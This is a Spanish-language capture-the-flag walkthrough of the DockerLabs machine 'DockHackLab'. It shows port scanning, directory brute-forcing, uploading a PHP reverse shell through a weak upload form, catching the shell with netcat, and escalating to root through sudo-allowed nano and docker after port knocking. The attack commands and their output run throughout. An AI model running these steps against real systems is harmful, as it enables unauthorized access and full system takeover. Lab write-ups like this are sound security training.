## DockHackLab
### Plataforma: Dockerlabs
### Nivel: Medio
### url: https://dockerlabs.es/
##
### WriteUp realizado por afgsanchez: https://afgsanchez.pythonanywhere.com/
##
```
└─# ping -c 1 172.17.0.2       
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.305 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.305/0.305/0.305/0.000 ms

```
```
└─# nmap -p- 172.17.0.2 -n -Pn --open -sS --min-rate 4000 -vvv -oN allports.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-17 18:57 CEST
Initiating ARP Ping Scan at 18:57
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 18:57, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:57
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 18:57, 32.95s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.00013s latency).
Scanned at 2024-07-17 18:57:02 CEST for 33s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 33.16 seconds
           Raw packets sent: 131095 (5.768MB) | Rcvd: 29 (1.260KB)

```

```
└─# nmap -p22,80 172.17.0.2 -sCV -oN targeted.txt                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-17 18:58 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000060s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9a:a2:73:65:c5:4f:dd:36:57:7c:53:f6:98:82:96:04 (ECDSA)
|_  256 c5:f4:bf:93:53:a3:8b:78:0c:8a:b2:fa:30:5b:b3:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.64 seconds

```

Examinamos el servicio web en el puerto 80.
![image](https://github.com/user-attachments/assets/13d29c1f-b8e5-4f0e-8ca7-6ba1201c1fe6)

A simple vista, solo tenemos la pagina de confirmación de instalación correcta de Apache2.

En el código de la página no se aprecia nada extraño.



Busco directorios. En esta occasion me decanto por dirsearch.
```
└─# dirsearch -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -r -e -x 403
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                             
                                                                                                                    
Extensions: -x | HTTP method: GET | Threads: 50 | Wordlist size: 220545

Output File: /home/kali/Desktop/dockerlabs/dockhacklab/reports/http_172.17.0.2/_24-07-17_19-04-13.txt

Target: http://172.17.0.2/

[19:04:13] Starting:                                                                                                
[19:04:47] 301 -  312B  - /hackademy  ->  http://172.17.0.2/hackademy/      
Added to the queue: hackademy/
[19:10:14] 403 -  275B  - /server-status   
...
```
Encontramos un directorio llamado /hackademy

Examinamos el directorio /hackademy
![image](https://github.com/user-attachments/assets/2be31c6b-65a2-4071-ba48-0b71fda56c81)

Parece una aplicación que nos permite subir archivos al servidor.
Reviso el codigo de la página.

```
<form action="upload.php" method="post" enctype="multipart/form-data">

```

Sigo el enlace a upload.php.

![image](https://github.com/user-attachments/assets/cd1c509e-9414-4938-9921-2621860966ea)

Parece que estamos limitados a subir archivos de imagen.

Vamos a subir uno a ver que pasa.

![image](https://github.com/user-attachments/assets/ab3ce687-45a9-4f56-a5c2-86cfc3a06a8e)

A pesar de subir un archivo .jpg me redirecciona a la web upload.php y parece que no funciona la subida.

Pruebo varias extensiones  de imagenes y no hay diferencia.

Decido probar a subir un tipo de extension distinta. Uso la reverseshell de pentestmonkey. Renombro el archivo a shelly.php y lo subo.

![image](https://github.com/user-attachments/assets/84fed8b6-a5ca-455d-8776-c08aaec340a7)

Esto parece que sí hace algo distinto.

Ahora debo localizar el archivo subido. 

Le doy muchisimas vueltas, incluso estoy un par de días pensando…
Casi tiro la toalla.

Despues de hacer cientos de pruebas llego a la simple conclusion de que el archivo se guarda en la ruta http://172.17.0.2/hakademy/xxx_shelly.php

Así que creo un script en python que sustituye las xxx por letras, haciendo todas las combinaciones posibles hasta que encuentra una respuesta válida.
![image](https://github.com/user-attachments/assets/b063620f-0883-48d6-a2d2-106d32146d31)

Se puede descargar el script desde mi github.
```
https://github.com/afgsanchez/writeups
```

Ahora pongo a netcat a la escucha en el puerto donde configuré la reverseshell.
```
└─# nc -nlvp 4444
listening on [any] 4444 ...
```

Y apunto en el navegador hacia la ruta encontrada por el script.
![image](https://github.com/user-attachments/assets/a1c5adb6-be6e-425f-8e22-90cf77db082a)

Vuelvo a mi terminal de netcat y conseguimos la intrusion!!

```
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 34030
Linux b26f6749e4a2 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.15-2kali1 (2024-05-17) x86_64 x86_64 x86_64 GNU/Linux
 03:25:11 up 46 min,  0 user,  load average: 0.31, 0.48, 0.52
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (33): Inappropriate ioctl for device
bash: no job control in this shell
www-data@b26f6749e4a2:/$ whoami
whoami
www-data
www-data@b26f6749e4a2:/$ 


```

Genial! 
Toca escalada.

Empezamos con lo típico: sudo -l

```
www-data@b26f6749e4a2:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on b26f6749e4a2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on b26f6749e4a2:
    (firsthacking) NOPASSWD: /usr/bin/nano
www-data@b26f6749e4a2:/$ 
```
Ok. vemos que podemos ejecutar como el usuario firsthacking el comando /usr/bin/nano.

Vamos a GTFOBins y vemos que podemos conseguir una terminal.
Primero vamos a mejorar nuestra terminal
```
script /dev/null -c bash
Ctrl+Z
stty raw -echo ; fg 
Enter
reset
Enter.
xterm
export TERM=xterm SHELL=bash
stty rows 40 columns 157
```

Ahora seguimos los pasos de GTFOBins

```
sudo -u firsthacking /usr/bin/nano 
Presiona Ctrl+R 
Presiona Ctrl+X  
Escribe: reset; bash 1>&0 2>&0 
Presiona Enter
```


Ya tenemos al usuario firsthacking!!

```
$ ls
firsthacking  ubuntu
$ whoami
firsthacking
```

Vamos a por root!

Probamos de nuevo sudo -l

```
$ sudo -l
Matching Defaults entries for firsthacking on b26f6749e4a2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User firsthacking may run the following commands on b26f6749e4a2:
    (ALL) NOPASSWD: /usr/bin/docker
```
Podemos ejecutar docker sin password!

Consultamos en GTFOBins:

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

```

Lo ejecuto, pero encuentro una respuesta inesperada!

```
firsthacking@b26f6749e4a2:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
�Fijate que hay algo esperando a que llames

 12345 54321 24680 13579 

De nada servira si no llamas antes

```


¿Se refiere a knockd?

```
firsthacking@b26f6749e4a2:~$ which knockd
/usr/sbin/knockd

```


Tiene pinta de que sí.

Vamos a probar:
En nuestra maquina atacante:

```
knock -v 172.17.0.2 12345 54321 24680 13579
```


Y de nuevo probamos en la maquina victima:

```
firsthacking@d7805eaf2e05:/$ sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?.
See 'docker run --help'.
firsthacking@d7805eaf2e05:/$ sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
ec99f8b99825: Pull complete 
Digest: sha256:b89d9c93e9ed3597455c90a0b88a8bbb5cb7188438f70953fede212a0c4394e0
Status: Downloaded newer image for alpine:latest

# whoami
root
# 

```
 

PWNED!!


